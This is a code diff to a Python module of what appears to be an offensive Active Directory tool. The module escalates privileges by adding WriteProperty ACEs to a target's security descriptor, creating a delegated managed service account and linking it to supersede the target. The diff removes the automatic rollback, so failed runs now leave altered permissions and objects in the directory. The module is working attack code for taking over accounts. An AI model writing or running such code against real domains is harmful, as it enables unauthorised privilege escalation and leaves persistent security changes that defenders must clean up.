@@ -3,6 +3,7 @@ from __future__ import annotations
 from typing import TYPE_CHECKING
 
 from dmsa_reaper.ldap.dacl_editor import (
+    ace_fingerprint,
     add_aces_to_sd,
     build_allow_writeproperty_ace,
     read_sd,
@@ -11,7 +12,6 @@ from dmsa_reaper.ldap.dacl_editor import (
 from dmsa_reaper.ldap.modify import add_object, modify_attribute
 from dmsa_reaper.models import AttributeChange, AttributeValue, Operation, PathCandidate
 from dmsa_reaper.ops.operation_log import new_operation, save_operation
-from dmsa_reaper.ops.rollback import rollback_operation
 from dmsa_reaper.ops.verify import verify_operation_ldap
 from dmsa_reaper.primitives._ldap_helpers import (
     DMSA_MANAGED_PASSWORD_INTERVAL,
@@ -20,6 +20,7 @@ from dmsa_reaper.primitives._ldap_helpers import (
     DMSA_UAC,
     dmsa_dn,
     generate_dmsa_name,
+    journal_created_object,
     read_attribute,
     resolve_meta,
 )
@@ -43,17 +44,11 @@ class DaclTargetEscalatePrimitive(Primitive):
     """Grant self WriteProperty on target attrs via DACL mod, then run postpatch flow.
 
     Workflow (four phases):
-      1. Read target nTSecurityDescriptor; record original bytes for rollback.
+      1. Read target nTSecurityDescriptor; record original bytes before modification.
       2. Add WriteProperty ACEs for msDS-SupersededManagedAccountLink and
          msDS-SupersededServiceAccountState (object-specific if attr GUIDs available).
       3. Create new dMSA under operator-supplied --container-dn.
       4. Write target superseded link and state (postpatch-mutual-pair steps 2-3).
-
-    Rollback order (managed by rollback_operation):
-      reversed(changed_attrs):  → restore msDS-SupersededServiceAccountState
-                                → restore msDS-SupersededManagedAccountLink
-                                → restore target DACL (nTSecurityDescriptor)
-      reversed(created_dns):    → delete dMSA
 
     Requires:
         - WriteDACL or WriteOwner on target (detected by classifier).
@@ -169,14 +164,22 @@ class DaclTargetEscalatePrimitive(Primitive):
                 build_allow_writeproperty_ace(principal_sid, link_guid_bytes),
                 build_allow_writeproperty_ace(principal_sid, state_guid_bytes),
             ]
+            aces = list(dict.fromkeys(aces))
+            operation.metadata.setdefault("added_aces", []).extend(
+                {
+                    "dn": target_dn,
+                    "sha256": ace_fingerprint(ace),
+                    "step_name": "dacl-mod",
+                }
+                for ace in aces
+            )
+            save_operation(operation)
             modified_sd = add_aces_to_sd(original_sd, aces)
             write_sd(conn, target_dn, modified_sd)
         except Exception as exc:
             operation.status = "partial-failed"
             operation.errors.append(f"target dacl write {target_dn}: {exc}")
             operation.metadata["execute_error"] = str(exc)
-            save_operation(operation)
-            rollback_operation(operation, conn=conn)
             save_operation(operation)
             raise PrimitiveError(f"Target DACL modification failed: {exc}") from exc
 
@@ -207,15 +210,14 @@ class DaclTargetEscalatePrimitive(Primitive):
                     "msDS-ManagedAccountPrecededByLink": target_dn,
                 },
             )
+            journal_created_object(operation, conn, new_dn)
         except Exception as exc:
             operation.status = "partial-failed"
             operation.errors.append(f"add_object {new_dn}: {exc}")
             operation.metadata["execute_error"] = str(exc)
             save_operation(operation)
-            rollback_operation(operation, conn=conn)
-            save_operation(operation)
             raise PrimitiveError(
-                f"dMSA creation failed — DACL and any partial writes rolled back: {exc}"
+                f"dMSA creation failed after DACL modification; partial state is recorded: {exc}"
             ) from exc
 
         if new_dn in operation.maybe_created_dns:
@@ -261,10 +263,8 @@ class DaclTargetEscalatePrimitive(Primitive):
             operation.errors.append(f"postpatch target write {target_dn}: {exc}")
             operation.metadata["execute_error"] = str(exc)
             save_operation(operation)
-            rollback_operation(operation, conn=conn)
-            save_operation(operation)
             raise PrimitiveError(
-                f"Postpatch target write failed — all writes rolled back: {exc}"
+                f"Postpatch target write failed; partial state is recorded: {exc}"
             ) from exc
 
         operation.status = "executed"
@@ -273,11 +273,6 @@ class DaclTargetEscalatePrimitive(Primitive):
 
     def verify(self, operation: Operation, *, conn: "Connection | None" = None) -> bool:
         return verify_operation_ldap(operation, conn=conn)
-
-    def rollback(self, operation: Operation, *, conn: "Connection | None" = None) -> bool:
-        operation = rollback_operation(operation, conn=conn)
-        save_operation(operation)
-        return operation.status == "rolled-back"
 
     def dry_run_steps(self, operation: Operation) -> list[str]:
         meta = operation.metadata
@@ -303,7 +298,7 @@ class DaclTargetEscalatePrimitive(Primitive):
         steps += [
             f"PHASE 1  READ    {target_dn}",
             "  attribute                               : nTSecurityDescriptor",
-            "  (original SD recorded for rollback)",
+            "  (original SD recorded before modification)",
             "",
             f"PHASE 2  MODIFY  {target_dn}",
             "  nTSecurityDescriptor                   : add ACEs",
@@ -319,7 +314,5 @@ class DaclTargetEscalatePrimitive(Primitive):
             f"PHASE 4  MODIFY  {target_dn}",
             f"  msDS-SupersededManagedAccountLink      → {new_dn}",
             f"  msDS-SupersededServiceAccountState     → {_STATE_ACTIVE}",
-            "",
-            "ROLLBACK: reverse phases 4→3→2→1 (attr changes, delete dMSA, restore DACL)",
         ]
         return steps
